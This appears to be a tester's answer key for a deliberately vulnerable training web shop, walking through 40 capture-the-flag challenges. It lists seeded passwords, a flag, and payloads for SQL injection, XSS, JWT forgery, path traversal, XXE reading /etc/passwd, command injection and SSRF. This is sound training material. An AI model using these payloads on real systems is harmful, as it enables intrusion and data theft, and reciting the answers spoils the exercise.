# Vinyl Vault — Full Walkthrough (all 40 challenges)

**SPOILER / TESTER GUIDE.** This walks through every challenge step by step so you
can verify the whole app. Keep it away from players.

Everything here is done **inside the app** using the two built-in pages:

- **🧪 HTTP Lab** — fire raw HTTP requests (method, URL, headers, JSON/raw body).
  Your team's `X-Team-Token` is attached automatically, so every solve is
  credited to your team and triggers confetti.
- **🛠 Tools** — forge JWTs, Base64-encode/decode, and URL-encode, all offline.

No external tools (Burp, jwt.io, CyberChef, curl…) are required.

---

## 0. Setup

1. Start the stack: `docker compose up --build` → open `http://localhost:3000`.
2. At the **team gate**, create a team (e.g. "Testers"). You'll get a join code
   and land in the shop. The header shows your team + score.
3. **Start the match clock.** Solves only score while the game is *running*. Open
   **🔧 Operator console** (link on the team gate), sign in with
   `gameadmin` / `vinylvault-ops`, and under **⏱ Match clock** click **Start**
   (give it e.g. 120 min so the last-15-min freeze doesn't hide your progress
   while testing). Until the clock is started, teams see a waiting screen and
   nothing scores.
4. Open **🧪 HTTP Lab**. The URL field is pre-filled with an example.

### How you know a challenge worked
- A **confetti burst + banner** ("Gefeliciteerd! Challenge behaald: …") + a sound.
- The **score** in the header goes up; **🎯 Challenges** marks it solved.
- The first team to score in a tier also gets a **🩸 first-blood** bonus
  (Easy +5 / Medium +10 / Hard +20 / Insane +30).

### Getting a shop-user token (needed for some challenges)
Some endpoints require a logged-in **shop account** (separate from the team
session). Two options:

- **Easiest:** register/log in through the **Account** page. The Lab's
  *"Add `Authorization` (shop login)"* checkbox then attaches your token
  automatically.
- **In the Lab:** send `POST /api/register` with `{ "email": "...", "password": "..." }`,
  copy `token` from the response, and paste `Authorization: Bearer <token>` into
  the Lab **Headers** box for the authenticated requests.

Seeded accounts: `admin@vinylvault.test / Vinyl!Admin2019`,
`dj.mole@vinylvault.test / spinspin` (security answer **Groovy**),
`ripley@vinylvault.test / nostromo`, `support@vinylvault.test / changeme`.
User ids: admin = 1, dj.mole = 2, ripley = 3, support = 4. Order #3 is an
internal admin order.

> In each step, headers not shown are left blank; `X-Team-Token` is always added
> for you. "Body (JSON)" means switch the Lab body tab to **JSON**.

---

# EASY — 10 pts each

## 1. Left the Lights On — `debug-config-exposed`
A left-behind debug endpoint dumps secrets.
- **Lab:** `GET` `/api/debug/config`
- Expect: JSON with env/config incl. the JWT secret.

## 2. Staff Only — `broken-access-control-header`
The server trusts a client-set role header.
- **Lab:** `GET` `/api/admin/users` · Headers: `X-User-Role: admin`
- Expect: the full user list.

## 3. Someone Else's Mail — `idor-order`
No ownership check on order ids. *(needs a shop token — see §0)*
- **Lab:** `GET` `/api/orders/1` · Headers: `Authorization: Bearer <your token>`
- Expect: order #1 (belongs to dj.mole, not you).

## 4. Know Thy Neighbour — `idor-user-record`
User lookup returns the full record. *(needs a shop token)*
- **Lab:** `GET` `/api/users/2` · Headers: `Authorization: Bearer <your token>`
- Expect: dj.mole's record including `secret_answer` ("Groovy") and password hash.

## 5. A Very Good Deal — `coupon-negative-total`
The discount is never clamped, so the total can go below zero.
- **Lab:** `POST` `/api/checkout/apply-coupon` · Body (JSON): `{ "total": 1, "code": "FIVER" }`
- Expect: `total: -4` (FIVER is a flat €5 off).

## 6. Echo Chamber — `reflected-xss-search`
The search query is echoed back and rendered verbatim.
- **Lab:** `GET` `/api/products/search?q=<img src=x onerror=alert(1)>`
- Expect: the response echoes your markup in `query`.

## 7. Nothing to See Here — `forced-browsing-robots`
An unlinked path is disclosed by robots.txt.
- **Lab:** `GET` `/robots.txt` → note `Disallow: /api/staff-lounge`
- **Lab:** `GET` `/api/staff-lounge`
- Expect: the staff-lounge JSON.

## 8. Out of the Box — `default-credentials`
A shipped support account with a default password.
- **Lab:** `POST` `/api/login` · Body (JSON): `{ "email": "support@vinylvault.test", "password": "changeme" }`
- Expect: a token (you logged into an admin backdoor account).

## 9. Name Your Price — `price-tampering`
Checkout trusts the client-sent unit price. *(needs a shop token)*
- **Lab:** `POST` `/api/orders` · Headers: `Authorization: Bearer <your token>` ·
  Body (JSON): `{ "items": [ { "productId": 1, "price": 0.01, "qty": 1 } ] }`
- Expect: order total ≈ `0.01`.

## 10. Less Than Nothing — `negative-quantity`
Negative quantities produce a negative total. *(needs a shop token)*
- **Lab:** `POST` `/api/orders` · Headers: `Authorization: Bearer <your token>` ·
  Body (JSON): `{ "items": [ { "productId": 1, "qty": -2 } ] }`
- Expect: a negative total.

---

# MEDIUM — 25 pts each

## 11. Off the Shelf — `sqli-search-internal-product`
Injection reveals internal (genre = "Misc") products.
- Payload: `%' OR '1'='1`
- **Lab:** `GET` `/api/products/search?q=%25'%20OR%20'1'='1`
  *(Tools → URL encoding can build this from `%' OR '1'='1`.)*
- Expect: results include internal items not on the shop floor.

## 12. The Backdoor Key — `sqli-login-bypass`
The email field is concatenated into the auth query.
- **Lab:** `POST` `/api/login` · Body (JSON): `{ "email": "' OR role='admin' --", "password": "x" }`
- Expect: a token without a valid password.

## 13. Leave a Note — `stored-xss-review`
A review is stored and rendered as-is.
- **Lab:** `POST` `/api/products/1/reviews` · Body (JSON):
  `{ "author": "attacker", "body": "<img src=x onerror=alert(1)>" }`
- Expect: `201`; open product 1 in the shop to see it render.

## 14. Fresh Start, Big Title — `mass-assignment-register-admin`
Register accepts an unlisted `role` field.
- **Lab:** `POST` `/api/register` · Body (JSON):
  `{ "email": "boss1@x.test", "password": "p", "role": "admin" }`
- Expect: `user.role: "admin"`. **Save this token** — you'll reuse it for #36.

## 15. Promotion — `mass-assignment-profile-admin`
Profile update trusts the `role` field. *(needs a shop token)*
- **Lab:** `PUT` `/api/me` · Headers: `Authorization: Bearer <your token>` ·
  Body (JSON): `{ "role": "admin" }`
- Expect: your role becomes admin.

## 16. Reading Between the Folders — `path-traversal-download`
No path sanitisation on the download endpoint.
- **Lab:** `GET` `/api/download?file=../server.js`
- Expect: the server source code.

## 17. Say Cheese — `insecure-upload-active-content`
Arbitrary files are accepted and served back. Use the JSON upload form so it
works from the Lab:
- **Lab:** `POST` `/api/upload` · Body (JSON):
  `{ "filename": "evil.html", "content": "<script>alert(1)</script>" }`
- Expect: `{ "url": "/uploads/evil.html" }`. Open `/uploads/evil.html` to confirm
  it's served as active content.

## 18. Sort It Out — `order-by-injection`
The `sort` parameter is concatenated into `ORDER BY`.
- Payload: `(CASE WHEN 1=1 THEN id END)`
- **Lab:** `GET` `/api/catalog?sort=(CASE%20WHEN%201=1%20THEN%20id%20END)`
- Expect: the echoed `sql` shows your injected clause.

## 19. Paper Trail — `idor-invoice`
Invoices are fetched by id with no ownership check.
- **Lab:** `GET` `/api/invoices/1`
- Expect: the invoice for order #1 (not yours).

## 20. Follow the Sign — `open-redirect`
The redirect target comes from a parameter.
- **Lab:** `GET` `/api/go?url=https://example.com`
- Expect: the Lab may show a *fetch error* because it follows the redirect
  off-site — that's fine, the solve is already recorded (watch the confetti /
  score).

---

# HARD — 40 pts each

## 21. Forgot Something? — `weak-password-reset`
Chains the profile disclosure (#4) into an account takeover.
- Step 1 — leak the answer: `GET` `/api/users/2` (with a shop token) → note
  `secret_answer` = "Groovy".
- Step 2 — reset: **Lab** `POST` `/api/reset/confirm` · Body (JSON):
  `{ "email": "dj.mole@vinylvault.test", "answer": "Groovy", "new_password": "pwned" }`
- Expect: success; dj.mole's password is now yours.

## 22. Guess the Signature — `jwt-weak-secret-forge`
Forge a token with the committed HS256 secret.
- **Tools → JWT (Forge):** alg `HS256`, secret `vinyl-vault-dev-secret`,
  Payload `{ "sub": 9999, "role": "admin" }` → **Build token** →
  **→ Use in HTTP Lab as Bearer**.
- In the Lab change the URL to `GET` `/api/admin/ledger` and Send.
- Expect: the ledger. (Sub 9999 isn't a real admin — the forged signature is
  what got you in.)

## 23. Twenty Questions — `blind-sqli-user-enum`
A yes/no endpoint that's injectable.
- Payload: `x' OR '1'='1`
- **Lab:** `GET` `/api/check-email?email=x'%20OR%20'1'='1`
- Expect: a boolean response; the injection is detected.

## 24. Phone Home — `ssrf-cover-art`
The server fetches a URL you give it.
- **Lab:** `POST` `/api/products/1/cover` · Body (JSON): `{ "url": "http://127.0.0.1:9090/" }`
- Expect: a note that the server tried to reach an internal address.

## 25. Poisoned Well — `prototype-pollution`
An unsafe recursive merge.
- **Lab:** `POST` `/api/preferences` · Body (JSON): `{ "__proto__": { "polluted": "yes" } }`
- Expect: `saved: true` (the `__proto__` key is the trigger).

## 26. Stack the Deck — `coupon-stacking`
Multiple coupons stack past 100%.
- **Lab:** `POST` `/api/checkout/apply-coupons` · Body (JSON):
  `{ "total": 10, "codes": ["BLACKFRIDAY","BLACKFRIDAY","WELCOME10","FIVER","FIVER"] }`
- Expect: combined `discount` ≥ `total`.

## 27. Now Playing — `command-injection`
Shell metacharacters are unfiltered (recognised, not executed).
- Payload: `8.8.8.8;id`
- **Lab:** `GET` `/api/tools/ping?host=8.8.8.8%3Bid`
- Expect: a note that an injected command was recognised.

## 28. Sleeper Agent — `second-order-sqli`
A stored field is later used unsafely. *(needs a shop token)*
- Step 1 — store the payload: `PUT` `/api/me` · Headers: `Authorization: Bearer <your token>` ·
  Body (JSON): `{ "display_name": "rob'; --" }`
- Step 2 — trigger: `GET` `/api/admin/audit`
- Expect: `anomalies: true`.

## 29. Spreadsheet Surprise — `csv-formula-injection`
Exported CSV cells aren't neutralised. *(needs a shop token)*
- Step 1 — plant a formula: `POST` `/api/orders` · Headers: `Authorization: Bearer <your token>` ·
  Body (JSON): `{ "items": [ { "productId": 1, "qty": 1 } ], "address": "=1+1" }`
- Step 2 — export: `GET` `/api/account/export.csv` · Headers: `Authorization: Bearer <your token>`
- Expect: a CSV whose address cell is the raw `=1+1` formula.

## 30. Bring Your Own Identity — `insecure-deserialization-cookie`
An encoded prefs blob is decoded and trusted.
- **Tools → Base64:** encode `{"role":"admin"}` → copy the result (e.g. `eyJyb2xlIjoiYWRtaW4ifQ==`).
- **Lab:** `GET` `/api/preferences/whoami?prefs=<paste base64>`
- Expect: `{ "role": "admin", "panel": "unlocked" }`.

---

# INSANE — 60 pts each

## 31. Sign Here — `jwt-alg-none`
A token that declares no signature is trusted.
- **Tools → JWT (Forge):** alg `none`, Payload `{ "sub": 1, "role": "admin" }` →
  **Build token** → **→ Use in HTTP Lab as Bearer** (URL is `/api/admin/stats`).
- Send. Expect: admin stats.

## 32. Fill in the Blanks — `ssti`
Template placeholders are evaluated server-side.
- **Lab:** `POST` `/api/orders/1/message` · Body (JSON): `{ "template": "result {{7*7}}" }`
- Expect: `rendered: "result 49"`.

## 33. Old School — `xxe`
XML entity declarations are recognised (external entities not resolved).
- **Lab:** `POST` `/api/import` · Body (JSON):
  `{ "xml": "<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/passwd\">]><x>&e;</x>" }`
- Expect: a note that a DOCTYPE/ENTITY was detected.

## 34. Deep Cut — `sqli-union-users`
UNION-based exfiltration from the users table.
- Payload: `%' UNION SELECT email,password FROM users--`
- **Lab:** `GET` `/api/products/search?q=%25'%20UNION%20SELECT%20email,password%20FROM%20users--`
- Expect: the request may return a column-mismatch error, but the UNION attempt
  is detected and the challenge solves regardless.

## 35. Trust Issues — `jwt-unverified-endpoint`
One endpoint reads the token but never verifies the signature.
- **Tools → JWT (Forge):** alg `HS256`, **secret** `whatever-wrong-secret`,
  Payload `{ "sub": 1, "role": "admin" }` → **Build token** →
  **→ Use in HTTP Lab as Bearer**.
- Change the Lab URL to `GET` `/api/premium/lounge` and Send.
- Expect: the lounge unlocks despite the bad signature.

## 36. The Vault — `admin-flag-captured`
Requires a **genuine** database admin (not a header trick, not a forged token
for a non-admin). Reuse the real admin account you created in **#14**.
- **Lab:** `GET` `/api/admin/vault` · Headers: `Authorization: Bearer <token from #14>`
- Expect: `flag: VV{you_became_a_real_admin}` and `master_key: 4471`.

## 37. Return to Sender — `host-header-injection`
The reset link trusts a forwarded host header.
- **Lab:** `POST` `/api/reset/link` · Headers: `X-Forwarded-Host: evil.example.com` ·
  Body (JSON): `{ "email": "dj.mole@vinylvault.test" }`
- Expect: `reset_link` pointing at `evil.example.com`.
  *(The real `Host` header can't be set from a browser, so the app honours the
  proxy header `X-Forwarded-Host` — the same real-world vector.)*

## 38. Catastrophe — `redos`
A crafted input that would make a vulnerable regex backtrack (recognised, not run).
- **Lab:** `GET` `/api/validate/handle?h=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`
  (about 30 `a`s followed by `!`)
- Expect: a note that the pattern would catastrophically backtrack.

## 39. Open House — `cors-credential-theft`
The shop reflects any origin and allows credentials.
- **Lab:** `GET` `/api/account/secret` · Headers: `X-Test-Origin: https://evil.example.com`
- Expect: the sensitive response is returned to a foreign origin.
  *(Browsers set `Origin` themselves and forbid overriding it, so the app also
  accepts `X-Test-Origin` for in-app testing.)*

## 40. Key Confusion — `jwt-kid-injection`
The token's `kid` is used in an injectable key lookup.
- **Tools → JWT (Forge):** in the **Header** box use
  `{ "typ": "JWT", "kid": "1' OR '1'='1" }`, alg `HS256`, any secret,
  Payload `{ "sub": 1 }` → **Build token** → **→ Use in HTTP Lab as Bearer**.
- Change the Lab URL to `GET` `/api/reports` and Send.
- Expect: reports returned; the injected `kid` is detected.

---

## Appendix — quick checklist

Easy: debug-config-exposed · broken-access-control-header · idor-order ·
idor-user-record · coupon-negative-total · reflected-xss-search ·
forced-browsing-robots · default-credentials · price-tampering · negative-quantity

Medium: sqli-search-internal-product · sqli-login-bypass · stored-xss-review ·
mass-assignment-register-admin · mass-assignment-profile-admin ·
path-traversal-download · insecure-upload-active-content · order-by-injection ·
idor-invoice · open-redirect

Hard: weak-password-reset · jwt-weak-secret-forge · blind-sqli-user-enum ·
ssrf-cover-art · prototype-pollution · coupon-stacking · command-injection ·
second-order-sqli · csv-formula-injection · insecure-deserialization-cookie

Insane: jwt-alg-none · ssti · xxe · sqli-union-users · jwt-unverified-endpoint ·
admin-flag-captured · host-header-injection · redos · cors-credential-theft ·
jwt-kid-injection

Solve all 40 (plus the four first-blood bonuses) for **1350 + 65 = 1415** points.
